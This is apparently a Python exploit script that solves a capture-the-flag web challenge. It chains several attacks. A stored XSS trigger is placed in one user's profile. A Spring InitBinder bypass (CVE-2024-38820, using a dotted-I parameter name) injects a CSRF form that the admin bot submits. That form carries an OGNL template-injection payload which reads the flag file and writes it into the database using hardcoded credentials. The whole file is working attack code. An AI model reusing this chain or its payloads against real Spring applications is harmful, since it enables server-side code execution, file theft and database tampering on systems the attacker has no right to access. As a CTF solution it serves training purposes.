#!/usr/bin/env python3
import os
import random
import re
import string
import time
import ssl
from urllib.request import urlopen

import requests

ctx = ssl._create_unverified_context()
WEB_URL = os.getenv("WEB_URL", "http://challenge.ara-its.id:8080")
BOT_URL = os.getenv("BOT_URL", "http://challenge.ara-its.id:3030")
PASSWORD = os.getenv("USER_PASSWORD", "pass123")
TIMEOUT = 12
FLAG_RE = re.compile(r"ARA7\{[^<}]+\}")


def rand_user(prefix: str) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return prefix + "".join(random.choice(alphabet) for _ in range(8))


def make_session() -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0"
    return s


def register_user(username: str, password: str) -> None:
    r = requests.post(
        f"{WEB_URL}/register/save",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=TIMEOUT,
    )
    if r.status_code not in (302, 303):
        raise RuntimeError(f"register failed for {username}: HTTP {r.status_code}")


def login(sess: requests.Session, username: str, password: str) -> None:
    r = sess.post(
        f"{WEB_URL}/login",
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=TIMEOUT,
    )
    if r.status_code not in (302, 303):
        raise RuntimeError(f"login failed for {username}: HTTP {r.status_code}")


def my_id(sess: requests.Session) -> int:
    r = sess.get(f"{WEB_URL}/profile", timeout=TIMEOUT)
    m = re.search(r'name="id" value="(\d+)"', r.text)
    if not m:
        raise RuntimeError("could not parse user id from /profile")
    return int(m.group(1))


def main() -> int:
    user_a = rand_user("a")
    user_b = rand_user("b")

    print(f"[+] creating users: {user_a}, {user_b}")
    register_user(user_a, PASSWORD)
    register_user(user_b, PASSWORD)

    sess_a = make_session()
    sess_b = make_session()
    login(sess_a, user_a, PASSWORD)
    login(sess_b, user_b, PASSWORD)

    aid = my_id(sess_a)
    bid = my_id(sess_b)
    print(f"[+] ids: A={aid}, B={bid}")

    # Fits confessions_count(20) and executes in iframe context.
    xss_trigger = '");parent.s.click("'
    r = sess_b.post(
        f"{WEB_URL}/profile/update",
        data={"password": PASSWORD, "confessionsCount": xss_trigger},
        allow_redirects=False,
        timeout=TIMEOUT,
    )
    if r.status_code not in (302, 303):
        raise RuntimeError(f"user B profile update failed: HTTP {r.status_code}")

    # OGNL runs inside admin report generation:
    # 1) discover /flag* filename
    # 2) read flag
    # 3) write flag into users.is_admin for all users (shorter payload)
    expr = (
        '#f=(new java.io.File("/")).list().{?#this.startsWith("flag")}[0],'
        '#g=new java.util.Scanner(new java.io.File("/"+#f)).nextLine(),'
        '#c=@java.sql.DriverManager@getConnection("jdbc:postgresql://db/confession_db","postgres","postgres"),'
        '#s=#c.createStatement(),'
        '#s.executeUpdate("update users set is_admin=\'"+#g+"\'"),'
        '#s.close(),#c.close(),"OK"'
    )
    expr_spel = expr.replace("'", "''")
    title_payload = f"[[${{T(ognl.Ognl).getValue('{expr_spel}',null)}}]]"

    # Name becomes JSON body via enctype=text/plain.
    # Escape for JSON string first, then for single-quoted HTML attribute.
    json_title = title_payload.replace("\\", "\\\\").replace('"', '\\"')
    json_title_attr = json_title.replace("'", "&#39;")

    html_payload = (
        "<form method=POST action=/admin/report/generate enctype=text/plain>"
        f"<input name='{{\"title\":\"{json_title_attr}\",\"a\":\"' value='\"}}'>"
        "<button id=s></button></form>"
        f"<iframe src=/user/{bid}></iframe>"
    )
    if len(html_payload) > 600:
        raise RuntimeError(f"payload too long for is_admin(600): {len(html_payload)}")

    # CVE-2024-38820 InitBinder bypass: Turkish capital dotted I.
    r = sess_a.post(
        f"{WEB_URL}/profile/update",
        data={"password": PASSWORD, "confessionsCount": "0", "İsAdmin": html_payload},
        allow_redirects=False,
        timeout=TIMEOUT,
    )
    if r.status_code not in (302, 303):
        raise RuntimeError(f"user A binder bypass update failed: HTTP {r.status_code}")

    print("[+] triggering bot visit")
    rb = requests.post(
        f"{BOT_URL}/visit",
        data={"userid": str(aid)},
        timeout=TIMEOUT + 10,
    )
    print(f"[+] bot response: HTTP {rb.status_code}")

    # Poll until admin-side action completes.
    for _ in range(12):
        page = sess_a.get(f"{WEB_URL}/user/{aid}", timeout=TIMEOUT).text
        m = FLAG_RE.search(page)
        if m:
            print(m.group(0))
            return 0
        time.sleep(1)

    raise RuntimeError("flag not found after bot trigger")


if __name__ == "__main__":
    raise SystemExit(main())
